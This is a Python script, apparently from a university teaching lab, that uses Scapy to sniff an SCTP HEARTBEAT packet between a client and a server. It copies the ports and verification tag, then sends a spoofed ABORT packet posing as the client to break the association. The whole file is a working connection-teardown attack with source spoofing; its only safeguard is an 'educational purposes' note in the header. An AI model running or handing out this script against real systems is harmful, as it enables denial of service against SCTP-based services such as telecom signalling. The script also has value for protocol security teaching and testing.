"""
===============================================================================
Script Name: abort_attack.py
Description : This script captures a HEARTBEAT SCTP packet to extract relevant information
              and sends an ABORT SCTP packet to execute an SCTP attack.
Author      : Grupo de Ingeniería Telemática. Universidad de Cantabria
===============================================================================

Notes:
- It uses Scapy library to sniff packets, extract relevant details, crafting a new packet, and send it.
- The script is designed to run in a controlled environment where SCTP traffic is present.
- Ensure you have Scapy installed and run this script with appropriate permissions.
- This script is for educational purposes only. Use responsibly and ethically.
===============================================================================
"""

from scapy.all import *

IP_CLIENT = "10.10.10.7" # Replace with the actual SCTP client IP
IP_SERVER = "10.10.10.155" # Replace with the actual SCTP server IP

"""
Function to check HEARTBEAT
The Python isinstance() function has problems with Scapy's dynamic class system, 
so the most robust is to inspect the 'type' field of the SCTP chunk directly.
"""
def is_heartbeat_packet(pkt: Packet) -> bool:
    if SCTP not in pkt:
        print("No SCTP layer")
        return False

    layer = pkt[SCTP].payload
    #print(f"First Chunk: {type(layer).__name__}")

    while isinstance(layer, Packet) and not isinstance(layer, NoPayload):
        print(f"   - Checking chunk type: {type(layer).__name__}")
        chunk_type = getattr(layer, "type", None)
        if chunk_type == 4:  # 4 = HEARTBEAT REQUEST
            #pkt.show()
            return True
        layer = layer.payload

    #print("No HEARTBEAT found")
    return False

def main():

    print(f"[*] Monitoring network for SCTP HEARTBEAT packet from {IP_CLIENT} to {IP_SERVER}...")
    packets = sniff(
        filter=f"sctp and src host {IP_CLIENT} and dst host {IP_SERVER}",
        lfilter=is_heartbeat_packet,
        count=1
    )

    # Extract the packet from the PacketList
    heartbeat_pkt = packets[0]

    # Extract and display relevant data
    src_ip = heartbeat_pkt[IP].src
    dst_ip = heartbeat_pkt[IP].dst
    src_port = heartbeat_pkt[SCTP].sport
    dst_port = heartbeat_pkt[SCTP].dport
    vtag = heartbeat_pkt[SCTP].tag

    print("\n[*] Captured HEARTBEAT packet details:")
    print(f"   - Source IP: {src_ip}")
    print(f"   - Destination IP: {dst_ip}")
    print(f"   - Source Port: {src_port}")
    print(f"   - Destination Port: {dst_port}")
    print(f"   - Verification Tag: {vtag:#010x}")

    # Build the ABORT package with “Don't Fragment”.
    abort_pkt = (
        IP(src=IP_CLIENT, dst=IP_SERVER, id=0x0000, flags="DF") /
        SCTP(sport=src_port, dport=dst_port, tag=vtag) /
        SCTPChunkAbort()
    )

    print("\n[*] ABORT packet parameters:")
    print(f"   - Source IP: {IP_CLIENT} (spoofed as Node Client)")
    print(f"   - Destination IP: {IP_SERVER} (Node Server)")
    print(f"   - Source Port: {src_port}")
    print(f"   - Destination Port: {dst_port}")
    print(f"   - Verification Tag: {vtag:#010x}")

    # Send the ABORT packet
    print(f"\n[*] Sending ABORT packet to Node Server ({IP_SERVER})...")
    send(abort_pkt, verbose=False)
    print("   - ABORT packet sent.")

if __name__ == "__main__":
    main()